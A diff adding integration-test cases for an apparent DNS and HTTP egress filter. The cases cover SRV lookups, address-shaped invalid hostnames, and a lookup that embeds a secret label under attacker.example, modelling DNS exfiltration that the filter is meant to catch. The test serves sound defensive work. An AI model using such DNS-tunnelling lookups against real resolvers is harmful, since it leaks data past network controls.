@@ -236,6 +236,19 @@ echo "=== [Reverse zone, invented name] ==="
 (nslookup SECRET-IN-A-NAME.in-addr.arpa >/dev/null 2>&1 || true)
 echo "  PASS  queried (checked in the report, see integration-test-inspect-restrict.sh)"
 
+# apt asks for this on every repository it fetches from, and falls back to the
+# plain name when nothing comes back. The lookup works; reporting it as blocked
+# would fail a step that ran fine.
+echo "=== [Service discovery, host allowed] ==="
+(nslookup -type=SRV _http._tcp.allowed.example.com >/dev/null 2>&1 || true)
+echo "  PASS  queried (checked in the report, see integration-test-inspect-restrict.sh)"
+
+# Prefixing `_a._tcp.` must not be a way out of the report, so the verb above
+# is held to names under a host the rules allow.
+echo "=== [Service discovery, host not allowed] ==="
+(nslookup -type=SRV _mongodb._tcp.SECRET-IN-A-NAME.attacker.example >/dev/null 2>&1 || true)
+echo "  PASS  queried (checked in the report, see integration-test-inspect-restrict.sh)"
+
 echo "=== [Address in a URL rule] ==="
 OUT=$($S http://10.200.0.100/pub-by-addr/x)
 check_ok "GET http://10.200.0.100/pub-by-addr/x" "$OUT" "ROOT GET"
@@ -243,6 +256,15 @@ check_ok "GET http://10.200.0.100/pub-by-addr/x" "$OUT" "ROOT GET"
 echo "=== [Address, path outside the rule] ==="
 CODE=$($C http://10.200.0.100/private/secret)
 check_status "GET http://10.200.0.100/private/secret" "$CODE" "403"
+
+# Not an address, however much it looks like one. Each falls through to the
+# resolver, which cannot answer it either.
+echo "=== [Address-shaped but invalid] ==="
+for H in 999.1.2.3 010.0.0.1 1.2.3.4.evil.example; do
+  CODE=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 10 \
+         --resolve "$H:80:10.200.0.100" "http://$H/pub-by-addr/x")
+  check_status "GET http://$H/pub-by-addr/x" "$CODE" "403"
+done
 
 # Port 9080, distinct from the :80 the URL rule above already allows, so
 # reaching it proves this ~regex allowed_ip_rules entry's own doing.
